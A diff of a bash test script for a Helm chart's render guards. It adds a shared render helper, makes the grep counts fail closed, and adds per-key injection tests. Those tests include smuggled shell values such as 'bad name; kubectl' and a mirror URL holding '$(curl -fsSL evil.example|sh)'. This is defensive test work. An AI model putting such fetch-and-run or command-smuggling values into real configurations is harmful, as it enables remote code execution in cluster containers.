@@ -5,9 +5,12 @@
 # to an INFO line and exits 0 — verified on helm 3.16.3, which prints
 # `level=INFO msg="funcMap fail"` for every guard it hits and still
 # reports "0 chart(s) failed". So the one job that looked like it
-# checked the guards could never fail on them, and every CI render
-# passes `--set data.keycloak.failOnPlaceholderSecrets=false` (the
-# shared render fixture), which switches two of them off entirely. A
+# checked the guards could never fail on them. The two placeholder
+# guards are disarmed in the render fixture the honest way: the
+# fixture's `clientSecrets` carry lint-dummy values and its convergence
+# envSecrets rows are complete, so nothing resolves to a placeholder —
+# not a `failOnPlaceholderSecrets=false` switch (no CI render passes
+# that; the flag stays ON everywhere). A
 # guard that stopped firing — an inverted condition, a deleted `fail` —
 # shipped green.
 #
@@ -66,13 +69,21 @@ valid_flags_except() {
   valid_flags | grep -v -- "$1"
 }
 
+# render_capture <flags...> — sets GUARD_OUTPUT and GUARD_RC for the
+# four helpers below, so the render mechanics live in exactly one copy.
+render_capture() {
+  GUARD_OUTPUT="$(helm template "${RELEASE}" "${CHART}" -n "${NS}" "$@" 2>&1)"
+  GUARD_RC=$?
+}
+
 # expect_fail <label> <expected message fragment> <flags...>
 expect_fail() {
   local label="$1" expected="$2"
   shift 2
   local output rc
-  output="$(helm template "${RELEASE}" "${CHART}" -n "${NS}" "$@" 2>&1)"
-  rc=$?
+  render_capture "$@"
+  output="${GUARD_OUTPUT}"
+  rc="${GUARD_RC}"
   if [ "${rc}" -eq 0 ]; then
     echo "FAIL: ${label} — the render SUCCEEDED; the guard did not fire"
     fails=$((fails + 1))
@@ -92,8 +103,9 @@ expect_ok() {
   local label="$1"
   shift
   local output rc
-  output="$(helm template "${RELEASE}" "${CHART}" -n "${NS}" "$@" 2>&1)"
-  rc=$?
+  render_capture "$@"
+  output="${GUARD_OUTPUT}"
+  rc="${GUARD_RC}"
   if [ "${rc}" -ne 0 ]; then
     echo "FAIL: ${label} — the render was REJECTED by a guard:"
     printf '%s\n' "${output}" | head -6
@@ -424,20 +436,20 @@ expect_fail "a clamav probe port that is not the listener's" \
 expect_render_contains() {
   local label="$1" needle="$2"
   shift 2
-  local output rc matches
-  output="$(helm template "${RELEASE}" "${CHART}" -n "${NS}" "$@" 2>&1)"
-  rc=$?
-  if [ "${rc}" -ne 0 ]; then
+  local matches
+  render_capture "$@"
+  if [ "${GUARD_RC}" -ne 0 ]; then
     echo "FAIL: ${label} — the render FAILED:"
-    printf '%s\n' "${output}" | head -6
+    printf '%s\n' "${GUARD_OUTPUT}" | head -6
     fails=$((fails + 1))
     return
   fi
   # grep -c, never -q: under pipefail, -q's early exit on the first
   # match SIGPIPEs the 700 KB render's writer and the pipeline reports
-  # 141 — a match counted as a miss. -c reads the whole input.
-  matches="$(printf '%s' "${output}" | grep -cF -- "${needle}")" || true
-  if [ "${matches}" -eq 0 ]; then
+  # 141 — a match counted as a miss. -c reads the whole input. An empty
+  # count (a killed grep) FAILS the guard: no evidence is not a pass.
+  matches="$(printf '%s' "${GUARD_OUTPUT}" | grep -cF -- "${needle}")" || true
+  if [ "${matches:-0}" -lt 1 ]; then
     echo "FAIL: ${label} — the render succeeded but does not contain: ${needle}"
     fails=$((fails + 1))
     return
@@ -449,17 +461,18 @@ expect_render_contains() {
 expect_render_lacks() {
   local label="$1" needle="$2"
   shift 2
-  local output rc matches
-  output="$(helm template "${RELEASE}" "${CHART}" -n "${NS}" "$@" 2>&1)"
-  rc=$?
-  if [ "${rc}" -ne 0 ]; then
+  local matches
+  render_capture "$@"
+  if [ "${GUARD_RC}" -ne 0 ]; then
     echo "FAIL: ${label} — the render FAILED:"
-    printf '%s\n' "${output}" | head -6
+    printf '%s\n' "${GUARD_OUTPUT}" | head -6
     fails=$((fails + 1))
     return
   fi
-  matches="$(printf '%s' "${output}" | grep -cF -- "${needle}")" || true
-  if [ "${matches}" -ne 0 ]; then
+  matches="$(printf '%s' "${GUARD_OUTPUT}" | grep -cF -- "${needle}")" || true
+  # An empty count is a killed grep, not a clean zero: the guard fails
+  # unless the count is EXACTLY 0.
+  if [ "${matches:-X}" != "0" ]; then
     echo "FAIL: ${label} — the render still contains: ${needle}"
     fails=$((fails + 1))
     return
@@ -488,10 +501,36 @@ expect_render_lacks \
 
 # 34. An operator-supplied Secret name reaches the test pods' shell:
 #     a value that is not a Kubernetes Secret name fails the RENDER
-#     naming the values key, never the shell inside the pod.
-expect_fail "a Secret name that is not a Secret name" \
-  "is not a valid Secret name" \
+#     naming the values key, never the shell inside the pod. One case
+#     per wrapped row — unwrapping any ONE of them must land a red
+#     guard here, not a silent raw interpolation.
+expect_fail "a Secret name that is not a Secret name (ingress.tls.secretName)" \
+  "ingress.tls.secretName" \
   $(valid_flags) --set ingress.enabled=true --set ingress.tls.enabled=true --set 'ingress.tls.secretName=not a name; kubectl'
+
+expect_fail "a Secret name that is not a Secret name (data.keycloak.db.secretName)" \
+  "data.keycloak.db.secretName" \
+  $(valid_flags) --set 'data.keycloak.db.secretName=bad name; kubectl'
+
+expect_fail "a Secret name that is not a Secret name (bootstrapAdmin.userSecret)" \
+  "data.keycloak.bootstrapAdmin.userSecret" \
+  $(valid_flags) --set 'data.keycloak.bootstrapAdmin.userSecret=bad name; kubectl'
+
+expect_fail "a convergence envSecrets row secretName that is not a Secret name" \
+  "is not a valid Secret name" \
+  $(valid_flags) --set 'data.keycloak.convergence.envSecrets[0].secretName=bad name; kubectl'
+
+# 34b. The two global tooling keys are interpolated into the tools-init
+#      container's shell: the values schema constrains them to the URL /
+#      architecture shapes, so a shell-bearing value is rejected by the
+#      render instead of executed by the init container.
+expect_fail "a kubeletToolsMirror carrying shell metacharacters" \
+  "kubeletToolsMirror" \
+  $(valid_flags) --set 'global.kubeletToolsMirror=https://dl.k8s.io$(curl -fsSL evil.example|sh)'
+
+expect_fail "a toolingArch outside the download URL's vocabulary" \
+  "toolingArch" \
+  $(valid_flags) --set global.toolingArch=x86_64
 
 # 32. The documented valid configuration must still render: a guard that
 #     rejects a good deployment is a defect too.
